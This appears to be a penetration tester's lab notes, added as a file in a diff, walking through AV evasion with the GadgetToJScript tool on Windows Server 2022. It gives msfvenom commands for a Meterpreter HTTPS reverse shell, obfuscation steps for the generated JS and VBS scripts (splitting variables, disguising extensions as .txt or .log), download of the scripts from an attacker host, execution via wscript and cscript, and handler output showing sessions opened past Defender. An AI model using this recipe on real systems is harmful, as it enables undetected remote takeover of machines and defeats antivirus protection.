@@ -1,0 +1,343 @@
+======================================================================================================================================================================
+AV bypass using the tool 'GadgetToJScript' 
+======================================================================================================================================================================
+
+GadgetToJScript
+===============
+> A tool for generating .NET serialized gadgets that can trigger .NET assembly load/execution when deserialized using BinaryFormatter from JS/VBS/VBA based scripts. 
+
+> Source: https://github.com/med0x2e/GadgetToJScript/tree/master
+
+> Details
+  + Bypasses AMSI without having to update AmsiEnable registry key or Hijack loadlibrary (AMSI.dll).
+  + Bypasses .NET 4.8+ newly introduced controls for blocking "Assembly.Load" and ActivitySurrogateSelector Type checks.
+  + Gadget supports proper deserialzation of payloads targetting .NET Framework 3.5 up to 4.8+ environments.
+  + Depends on ActivitySurrogateSelector to create a Surrogate class which act as a wrapper to deserialize a gadget built in a way to trigger a call to 
+    "Activator.CreateInstance(Assembly.Load(your_assembly_bytes).GetType())".
+  + Leveraging TextFormattingRunProperties based gadget as a first deserialization stage to disable ActivitySurrogateSelector Type check therefore bypassing fixes 
+    introduced recently in (.NET Framework 4.8+)
+  + Doesn't rely mainly on exposing a .NET based COM object hence no need to call d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
+  + Delegates are used only to trigger payload execution during deserialization (Func<Assembly, IEnumerable>),a requirement for proper chaining of the gadget elements.
+  + Serialized gadgets or Streams length is calculated at runtime and automatically populated in the generated WSH scripts (Not required for VBA).
+  + Generates VBS/VBA and JS/HTA scripts relying on registration-free activation of .NET based COM components
+
+> OPSEC notes
+  + It is necessary to manually obfuscate the JS/VBS/HTS scripts generated with 'GadgetToJScript' to fully bypass AV like MS Defender.
+  + Example of basic obfuscation for the JS scripts:
+    > Rename the functions and variables in the script
+    > Delete existing comments and add fake ones
+    > Split the 2 variables 'stage_1' and 'stage_2' in several parts
+      Example:  
+      var part1 = " XXXXX";
+      var part2 = " XXXXX";    
+      var stage_1 = part1.concat(part2);
+    > Change the extension file format from '.js' to '.txt' or '.log' or '.csv', etc.
+      You will need to specify in the WSCRIPT or CSCRIPT command that it is a JS script to run 
+      => Example: C:\temp> wscript.exe //E:javascript script-name.txt
+
+
+=============================================================================================================================================
+PoC - Execute a Metasploit Https reverse shell embeded in JS and VBS scripts generated with the tool 'GadgetToJScript'
+      on a Windows server 2022 without being detected by the Microsoft Defender Antivirus
+=============================================================================================================================================
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+Step 1. Download and compile the source code of the tool 'GadgetToJScript'
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+> Source: https://github.com/med0x2e/GadgetToJScript/tree/master
+
+Visual Studio:
+-------------
+00:53:51:320	Build started...
+00:53:51:579	1>------ Build started: Project: GadgetToJScript, Configuration: Debug Any CPU ------
+00:53:51:982	1>  C:\Users\auditor\Downloads\GadgetToJScript\GadgetToJScript-master\GadgetToJScript\Program.cs(125,30,125,31): warning CS0168: The variable 'e' is declared but never used
+00:53:51:998	1>  GadgetToJScript -> C:\Users\auditor\Downloads\GadgetToJScript\GadgetToJScript-master\GadgetToJScript\bin\Debug\GadgetToJScript.exe
+00:53:52:009	========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========
+00:53:52:009	========== Build started at 12:53 AM and took 00.836 seconds ==========
+
+
+C:\Users\auditor\Downloads\GadgetToJScript\GadgetToJScript-master\GadgetToJScript\bin\Debug\GadgetToJScript.exe
+
+Try --help for more information.
+
+Usage:
+  -w, --scriptType=VALUE     Set to js, vbs, vba or hta.
+
+  -b, --bypass               Bypass type check controls introduced in .NET version 4.8+, by default set to false, set to
+                               true (--bypass/-b) in case WSH scripts are being generated to run on .NET version > 4.8+ .
+
+  -e, --encodeType=VALUE     VBA gadgets encoding: b64 or hex (default set to b64),
+
+  -o, --output=VALUE         Generated payload output file, example: -o C:\Users\userX\Desktop\output (Without extension)
+
+  -r, --regfree              registration-free activation of .NET based COM components, applicable to JS/HTA scripts only.
+
+  -a, --assembly=VALUE       .NET Assembly, example: -a C:\Users\userX\Desktop\shellcode_loader.dll,
+                               alternatively you can specify a c# source file instead using -c cmdline switch.
+
+  -c, --csfile=VALUE         C# source code file, example: -c C:\Users\userX\Desktop\shellcode_loader.cs, 
+                             make sure to place your code within the default constructor of your class and
+                             specify any required dependencies using -d cmdline switch.
+
+  -d, --references=VALUE     Reference Assemblies, example: -d System.Window-s.Forms.dll, System.dll
+
+  -h, --help                 Show Help
+Press any key to continue . . .
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+Step 2. Generate a Metasploit HTTPs reverse shell in C# format and insert it in a C# shellcode loader 
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/GadjetToJScript-test$ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/MSF/pentest.pem 
+                                                  LHOST=192.168.1.94 LPORT=443 -a x64 -f csharp -o shellcodeMSFstagelessHTTPS
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 201308 bytes
+Final size of csharp file: 1019995 bytes
+Saved as: shellcodeMSFstagelessHTTPS
+
+
+Many shellcode loader code in C# are available on the Internet (security blogs, github, etc.)
+
+=> You can use for example the following GitHub project: 'https://github.com/JimKw1kX/Shellcode-Injector/tree/main'
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+Step 3. Use the tool 'GadgetToJScript' to generate JS and VBS scripts that will embed our C# shellcode loader 
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+-----------------------------------------------------------------------------------
+3.a - Generate a JS script with 'GadgetToJScript' and then manually obfuscate it
+-----------------------------------------------------------------------------------
+
+C:\Users\auditor\Documents\Tools-Pentest\1-Antivirus-bypass\GadgetToJScript> GadgetToJScript.exe -c C:\Temp\Shellcode-loader.cs -o C:\Temp\JS-script.js -w js -b
+[+]: Generating the js payload
+[+]: First stage gadget generation done.
+[+]: Compiling your .NET code located at: C:\Temp\Shellcode-loader.cs
+[+]: Second stage gadget generation done.
+[*]: Payload generation completed, check: C:\Temp\JS-script.js
+
+
+Basic obfuscation to avoid static AV detection
+===============================================
+> Rename the functions and variables in the JS script
+> Delete existing comments and add fake ones
+> Split the 2 variables 'stage_1' and 'stage_2' in several parts
+  Example:  
+    var part1 = " XXXXX";
+    var part2 = " XXXXX";    
+    var stage_1 = part1.concat(part2);
+> Change the extension file format '.js' to '.txt' or '.log' or '.xml', ...
+  => 'JS-script.js' become 'JS-script.txt'
+
+  Note: We will specify that it is a JS script to run in the WSCRIPT command
+  => Example: C:\temp> wscript.exe //E:javascript script-name.txt
+
+
+-----------------------------------------------------------------------------------
+3.b - Generate a VBS script with 'GadgetToJScript' and then manually obfuscate it
+-----------------------------------------------------------------------------------
+
+C:\Users\auditor\Documents\Tools-Pentest\1-Antivirus-bypass\GadgetToJScript> GadgetToJScript.exe -c C:\Temp\Shellcode-loader.cs -o C:\Temp\VB-script -w vbs -b
+[+]: Generating the vbs payload
+[+]: First stage gadget generation done.
+[+]: Compiling your .NET code located at: C:\Temp\Shellcode-loader.cs
+[+]: Second stage gadget generation done.
+[*]: Payload generation completed, check: C:\Temp\VB-script.vbs
+
+
+Basic obfuscation to avoid static AV detection
+===============================================
+> Rename the functions and variables in the VBS script
+> Delete existing comments and add fake ones
+> Change the extension file format '.vbs' to '.txt' or '.log' or '.xml', ...
+  => 'VB-script.vbs' become 'VB-script.log'
+
+  Note: We will specify that it is a VBS script to run in the CSCRIPT command
+  => Example: C:\temp> cscript.exe //E:vbscript script-name.log
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+Step 4. Download and execute the JS and VBS scripts on a Windows server 2022 protected by Windows Defender AV 
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator> systeminfo
+
+Host Name:                 SERVER-WIN2022
+OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
+OS Version:                10.0.20348 N/A Build 20348
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+<snip>
+
+
+PS C:\Users\Administrator> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled, AntivirusSIgnatureLastUpdated|FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSIgnatureLastUpdated : 7/21/2025 11:54:13 AM
+
+
+Test of the VBS script => No AV detection during the download and the execution
+================================================================================== 
+
+PS C:\Users\Administrator> wget -uri http://192.168.1.144:8080/VB-script.log -OutFile C:\temp\VB-script.log
+
+PS C:\Users\Administrator> cmd
+Microsoft Windows [Version 10.0.20348.3692]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>cd c:\temp
+
+c:\temp>cscript.exe //E:vbscript .\VB-script.log
+Microsoft (R) Windows Script Host Version 5.812
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+c:\temp>
+c:\temp> exit
+
+
+Test of the JS script => No AV detection during the download but an AV warning message was displayed during the execution
+=========================================================================================================================
+
+PS C:\Users\Administrator> wget -uri http://192.168.1.144:8080/JS-superscript.txt -OutFile C:\temp\JS-script.txt
+
+PS C:\Users\Administrator> cmd
+Microsoft Windows [Version 10.0.20348.3692]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>cd C:\temp
+
+C:\temp>wscript //E:javascript .\JS-superscript.txt
+
+C:\temp>
+
+=> We got a warning message from Microsoft Defender AV which requested a 'sample submission' but did not blocked the attack.
+   It is strange because all the AV settings such as 'Automatic sample submission' and 'Cloud-delivered Protections' were enabled !!
+
+   Sample submission
+   Microsoft Defender Antivirus would like to check the following files to see if they are safe.
+   - C:\temp\JS-script.txt
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Step 5. Get your 2 Metasploit Https reverse shells from the VBS and JS scripts downloaded and executed on the Windows server 2022 protected by Windows Defender AV
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST 192.168.1.94; set LPORT 443; set EXITFUNC thread; 
+             set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableStageEncoding true; set EnableUnicodeEncoding true; 
+             set HandlerSSLCert /home/jeff/Documents/Tools/MSF/pentest.pem; run -j"
+
+                                   ___          ____
+                               ,-""   `.      < HONK >
+                             ,'  _   e )`-._ /  ----
+                            /  ,' `-._<.===-'                                                                                                              
+                           /  /                                                                                                                            
+                          /  ;                                                                                                                             
+              _          /   ;                                                                                                                             
+ (`._    _.-"" ""--..__,'    |                                                                                                                             
+ <_  `-""                     \                                                                                                                            
+  <`-                          :                                                                                                                           
+   (__   <__.                  ;                                                                                                                           
+     `-.   '-.__.      _.'    /                                                                                                                            
+        \      `-.__,-'    _,'                                                                                                                             
+         `._    ,    /__,-'                                                                                                                                
+            ""._\__,'< <____                                                                                                                               
+                 | |  `----.`.                                                                                                                             
+                 | |        \ `.                                                                                                                           
+                 ; |___      \-``                                                                                                                          
+                 \   --<                                                                                                                                   
+                  `.`.<                                                                                                                                    
+                    `-'                                                                                                                                    
+                                                                                                                                                           
+       =[ metasploit v6.1.14-dev                          ]                                                                                                
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]                                                                                                
++ -- --=[ 596 payloads - 46 encoders - 10 nops            ]                                                                                                
++ -- --=[ 9 evasion                                       ]                                                                                                
+                                                                                                                                                           
+Metasploit tip: Enable HTTP request and response logging 
+with set HttpTrace true
+
+[*] Starting persistent handler(s)...
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_https
+LHOST => 192.168.1.94
+LPORT => 443
+EXITFUNC => thread
+ExitOnSession => false
+SessionCommunicationTimeout => 0
+EnableStageEncoding => true
+EnableUnicodeEncoding => true
+HandlerSSLCert => /home/jeff/Documents/Tools/MSF/pentest.pem
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started HTTPS reverse handler on https://192.168.1.94:443
+
+msf6 exploit(multi/handler) > 
+[*] https://192.168.1.94:443 handling request from 192.168.1.11; (UUID: mbp82fjp) Redirecting sp0GSaa-T6-a0pIXPNUcXyYjApMYW4beKv8zE6As6rS3Q5sTaGH5xa633zSxM79oRrl1v8H0kaAiiyYiy9bR6itFDcGKW- wike Gecko'
+[*] https://192.168.1.94:443 handling request from 192.168.1.11; (UUID: mbp82fjp) Attaching orp
+[*] Meterpreter session 1 opened (192.168.1.94:443 -> 127.0.0.1 ) at 2025-07-21 21:11:03 +0200
+
+msf6 exploit(multi/handler) > sessions -i
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                  Connection
+  --  ----  ----                     -----------                  ----------
+  1         meterpreter x64/windows  SERVER-WIN2022\Administrato  192.168.1.94:443 -> 127.0.0
+                                     r @ SERVER-WIN2022           .1  (192.168.1.11)
+
+
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > 
+
+meterpreter > sysinfo
+Computer        : SERVER-WIN2022
+OS              : Windows 2016+ (10.0 Build 20348).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x64/windows
+
+meterpreter > exit
+
+meterpreter > exit
+[*] Shutting down Meterpreter...
+
+[*] 192.168.1.11 - Meterpreter session 1 closed.  Reason: User exit
+
+
+msf6 exploit(multi/handler) > 
+
+msf6 exploit(multi/handler) > 
+[*] https://192.168.1.94:443 handling request from 192.168.1.11; (UUID: mbp82fjp) Redirecting stageless connection from /S6jNw0_It0DM483hpJ1fOQUlqPkUyRyR2TpBN
+    lVTIF7xlj7ui9fXYtlYLatGnWFrbsZCQGrEO0u7vxz4z2NI2I5Pw5PYQjtJ12RtZRqFmx9NaqQ8PcomWPCfWx with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
+[*] https://192.168.1.94:443 handling request from 192.168.1.11; (UUID: mbp82fjp) Attaching orphaned/stageless session...
+[*] Meterpreter session 2 opened (192.168.1.94:443 -> 127.0.0.1 ) at 2025-07-21 21:24:11 +0200
+
+msf6 exploit(multi/handler) > sessions -i
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                  Connection
+  --  ----  ----                     -----------                  ----------
+  2         meterpreter x64/windows  SERVER-WIN2022\Administrato  192.168.1.94:443 -> 127.0.0
+                                     r @ SERVER-WIN2022           .1  (192.168.1.11)
+
+msf6 exploit(multi/handler) > 
